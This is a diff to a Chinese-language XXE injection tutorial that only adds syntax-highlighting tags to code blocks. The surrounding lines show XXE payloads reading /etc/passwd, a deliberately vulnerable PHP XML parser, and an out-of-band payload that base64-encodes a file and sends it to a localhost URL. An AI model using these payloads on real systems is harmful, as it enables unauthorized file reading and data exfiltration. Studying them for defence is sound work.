@@ -45,7 +45,7 @@ XXE -"xml external entity injection"即"xml外部实体注入漏洞"。
 
 **情景一：**
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE note [    
   <!ELEMENT note any>   
@@ -58,7 +58,7 @@ XXE -"xml external entity injection"即"xml外部实体注入漏洞"。
 
 **情景二：**
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE note [    
   <!ELEMENT note any>   
@@ -72,13 +72,13 @@ XXE -"xml external entity injection"即"xml外部实体注入漏洞"。
 
 `hack.dtd`文件内容：
 
-```
+```xml-dtd
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >
 ```
 
 **情景三：**
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE note SYSTEM "hack.dtd">
 
@@ -87,7 +87,7 @@ XXE -"xml external entity injection"即"xml外部实体注入漏洞"。
 
 `hack.dtd`文件内容：
 
-```
+```xml-dtd
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >
 ```
 
@@ -106,7 +106,7 @@ XXE -"xml external entity injection"即"xml外部实体注入漏洞"。
 
 基本漏洞源码：
 
-```
+```php
 <?php
     $xml=simplexml_load_string($_REQUEST['xml']);
     echo "<p>$xml</p>"
@@ -135,7 +135,7 @@ Payload:`<!DOCTYPE note [<!ELEMENT note ANY ><!ENTITY xxe SYSTEM "file:///S://aa
 
 Payload:
 
-```
+```xml-dtd
 <!DOCTYPE note [ 
   <!ELEMENT note ANY >
   <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/S:/test.txt">
@@ -145,7 +145,7 @@ Payload:
 
 `evil.xml`文件内容：内部`send`的`%`要用实体：`&#x25;`
 
-```
+```xml-dtd
 <!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>"> 
 ```
 
